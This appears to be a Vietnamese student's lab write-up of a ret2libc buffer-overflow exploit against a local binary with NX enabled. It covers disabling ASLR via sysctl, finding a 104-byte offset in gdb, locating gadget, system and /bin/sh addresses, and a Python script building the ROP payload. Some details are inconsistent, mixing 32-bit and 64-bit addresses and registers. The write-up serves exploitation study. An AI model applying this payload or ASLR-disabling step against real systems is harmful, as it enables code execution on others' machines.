#1-Ret2libc
- Đầu tiên em thử chạy gdb xem flow chương trình, kiểm tra checksec thì cơ chế NX bị bật nên không thể thực thi shellcode trên stack được.

- Ý tưởng: Khai thác bằng ROP pop edi ; ret để vượt qua cơ chế bảo vệ NX khi đó chương trình sẽ không trả về hàm gọi mà sẽ đi tiếp các lệnh tiếp theo nên ta chèn /bin/sh vào đó. Vì địa chỉ của ret2libc bị ramdom nên tắt cơ chế ramdom đi
```
sysctl -w kernel.randomize_va_space=0
```
- Hàm vuln: đặt breakpoint để xem khoảng byte tràn
![Screenshot 2022-03-26 135127](https://i.imgur.com/24O99jR.png)
- Địa chỉ buffer : 
```
>>> hex(0x7fffffffdef0-0x60)
'0x7fffffffde90'
```
- Địa chỉ return : 0xbffffc9c
![Screenshot 2022-03-26 135448](https://i.imgur.com/2mNXt8H.png)
- Khoảng cách:
```
>>> 0x7fffffffdef8-0x7fffffffde90
104
```
- Địa chỉ của pop_edi_ret , system, bin/sh

- Tìm địa chỉ "pop_edi_ret"
![Screenshot 2022-03-26 135907](https://i.imgur.com/2OMpakl.png)
- Tìm địa chỉ system, "/bin/sh" 
![Screenshot 2022-03-26 140100](https://i.imgur.com/GSpKBRv.png)
- Viết exploit
```
import struct
pop_rdi_ret = 0x4006a3
system = 0x7ffff7e21860
bin_sh = 0x4006ff
payload = ""
payload += "A"*104
payload += struct.pack("<Q",pop_rdi_ret)
payload += struct.pack("<Q",bin_sh)
payload += struct.pack("<Q",system)
f = open("ret.txt", "w")
f.write(payload)
print(payload)
```
![Screenshot 2022-03-26 140302](https://i.imgur.com/gHS7Yi1.png)